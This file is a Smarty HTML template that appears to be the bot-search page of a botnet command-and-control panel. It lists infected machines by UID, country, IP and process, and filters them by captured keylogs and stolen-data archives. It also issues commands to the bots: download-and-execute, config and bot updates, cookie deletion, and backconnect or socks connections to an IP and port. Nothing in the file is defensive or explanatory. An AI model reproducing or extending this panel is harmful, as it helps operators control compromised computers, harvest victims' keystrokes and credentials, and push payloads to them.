{if $_SESSION.user->access.bots.filter_country_list eq on}
<div style="text-align: right; padding-right: 10px; padding-left: 10px">
<form name="filters_country" id="filters_country" action="#" method="post" enctype="application/x-www-form-urlencoded">

{if $_SESSION.search.bots.mamb eq 'true'}
{if $_SESSION.user->config.prefix eq ''}
<span style="position: relative; top: -200px">{$lang.mamb} (<a onclick="alert('{$lang.mambl}');" style="cursor:pointer">?</a>): </span><textarea name="multibot" style="width:600px; height: 400px; border: 1px #333 solid;">{$_SESSION.search.bots.multibot}</textarea>
<hr />
{/if}

{else}

{if $_SESSION.user->config.prefix eq ''}
{$lang.mapref} (<a onclick="alert('{$lang.mpmstbla}');" style="cursor:pointer">?</a>): <input id="prefix" name="prefix" value="{$_SESSION.search.bots.prefix}" style="width:600px" />
<hr />
{/if}
{$lang.mauid} (<a onclick="alert('{$lang.mymsblaic}');" style="cursor:pointer">?</a>): <input id="uid" name="uid" value="{$_SESSION.search.bots.uid}" style="width:600px" />
<hr />
{/if}
{$lang.maip} (<a onclick="alert('{$lang.mikci}');" style="cursor:pointer">?</a>): <input id="ip" name="ip" value="{$_SESSION.search.bots.ip}" style="width:600px" />
<hr />
{$lang.mapro} (<a onclick="alert('{$lang.mapro}');" style="cursor:pointer">?</a>): <input id="process" name="process" value="{$_SESSION.search.bots.process}" style="width:600px" />
<hr />
{$lang.country}: <select id="country" name="country" style="width:600px">
<option value="" selected="selected">{$lang.neyc}</option>
{foreach from=$country item=c}
<option value="{$c->country}" {if $_SESSION.search.bots.country eq $c->country}selected="selected"{/if}>{$country_code[$c->country]}</option>
{/foreach}
</select>
<hr />
{$lang.sleje}: <select name="tracking" style="width:600px">
<option value="" selected="selected">{$lang.neyc}</option>
<option value="1" {if $_SESSION.search.bots.tracking eq '1'}selected="selected"{/if}>{$lang.vikl}</option>
<option value="2" {if $_SESSION.search.bots.tracking eq '2'}selected="selected"{/if}>{$lang.vkl}</option>
</select>
<hr />
{$lang.sortco}: <select name="sort" style="width:600px">
<option value="" selected="selected">{$lang.stan}</option>
<option value="conn1" {if $_SESSION.search.bots.sort eq 'conn1'}selected="selected"{/if}>{$lang.pkpv}</option>
<option value="conn2" {if $_SESSION.search.bots.sort eq 'conn2'}selected="selected"{/if}>{$lang.pkvy}</option>
</select>
<hr />
{$lang.zvl}: <select name="logs" style="width:600px">
<option value="" {if $_SESSION.search.bots.logs eq ''}selected="selected"{/if}>{$lang.neyc}</option>
<option value="keylogs" {if $_SESSION.search.bots.logs eq 'keylogs'}selected="selected"{/if}>{$lang.keylog}</option>
<option value="cabs" {if $_SESSION.search.bots.logs eq 'cabs'}selected="selected"{/if}>{$lang.cabs}</option>
</select>
<hr />
{$lang.typoi}: <select name="type" style="width:600px">
<option value="1" {if $_SESSION.search.bots.type eq '1'}selected="selected"{/if}>{$lang.tyor}</option>
<option value="2" {if $_SESSION.search.bots.type eq '2'}selected="selected"{/if}>{$lang.tyand}</option>
</select>
{if $list|@count > 0}
<hr />
{$lang.dlk}: <select name="cmd" style="width:200px">
<option value="download"{if $smarty.post.cmd eq 'download'} selected="selected"{/if}>{$lang.dlolauf}</option>
<option value="multidownload"{if $smarty.post.cmd eq 'multidownload'} selected="selected"{/if}>{$lang.dlolaufm}</option>
<option value="updateconfig"{if $smarty.post.cmd eq 'updateconfig'} selected="selected"{/if}>{$lang.upcfg}</option>
<option value="update"{if $smarty.post.cmd eq 'update'} selected="selected"{/if}>{$lang.updates}</option>
<option value="deletecookies"{if $smarty.post.cmd eq 'deletecookies'} selected="selected"{/if}>{$lang.delcoo}</option>
<option value="sb"{if $smarty.post.cmd eq 'sb'} selected="selected"{/if}>SB (ip:port)</option>
<option value="bc"{if $smarty.post.cmd eq 'bc'} selected="selected"{/if}>BC (ip:port)</option>
<option value="">{$lang.ipsisplk}</option>
</select>&nbsp;<input type="text" name="link" class="user" style="width:400px" value="{$smarty.post.link}" />
{/if}
<hr />
<input type="button" name="update" value="{$lang.upda}" style="width:80%" onclick="document.forms['filters_country'].elements['mamb'].value = '{$_SESSION.search.bots.mamb}'; get_hax({ldelim}url: '/bots/search.html?ajax=1',method:'post',id:'content',form:this.form.name{rdelim});" /> {if $_SESSION.search.bots.mamb ne 'true'}
<input type="button" name="mamb" value="{$lang.mamb}" style="width:19%" onclick="this.value = 'true'; get_hax({ldelim}url: '/bots/search.html?ajax=1',method:'post',id:'content',form:this.form.name{rdelim});" />
{else}
<input type="button" name="mamb" value="{$lang.mambs}" style="width:19%" onclick="this.value =' false'; get_hax({ldelim}url: '/bots/search.html?ajax=1',method:'post',id:'content',form:this.form.name{rdelim});" />
{/if}
{if $list|@count > 0}<hr />
</form>
<input type="button" name="update_set_cmd" value="{$lang.dlk}" style="width:100%" onclick="document.forms['filters_country'].elements['mamb'].value = '{$_SESSION.search.bots.mamb}'; get_hax({ldelim}url: '/bots/search.html?ajax=1&str=cmd_set',method:'post',id:'content',form:'filters_country'{rdelim});" />
{/if}
</div>
<hr />
{/if}
<br />
{if $_SESSION.search.bots.mamb eq 'true'}
<div style="color:#FF0000;position:relative" align="center">{$lang.mambcs}</div>
{else}
<div style="font-size:10px; position:relative" align="center">
<div style="position:absolute; left: 0px; top:10px">{$lang.msns}: {$_SESSION.user->config.cp.bots_country}</div>
&nbsp;{$pages}&nbsp;
<div style="position:absolute; right: 0px; top:10px">{$lang.vsbo}: {$counts}</div>
</div>
{/if}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 65%; text-align: center">{$lang.poluid}</td>
<td style="width: 20%; text-align: center">{$lang.country}</td>
<td style="width: 15%; text-align: center">{$lang.ip}</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr id="tr_{$key}" class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;">
<th onclick="get_bot_window('{$item->id}');" title="{$item->uid}">{$item->prefix}{$item->uid}</th>
<th onclick="get_bot_window('{$item->id}');">{$country_code[$item->country]}</th>
<th onclick="get_bot_window('{$item->id}');">{$item->ip}</th>
</tr>
{/foreach}
</table>

{if $_SESSION.search.bots.mamb eq 'true'}
<br />
<div style="color:#FF0000;position:relative" align="center">{$lang.mambcs}</div>
<br />
{else}
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>
{/if}

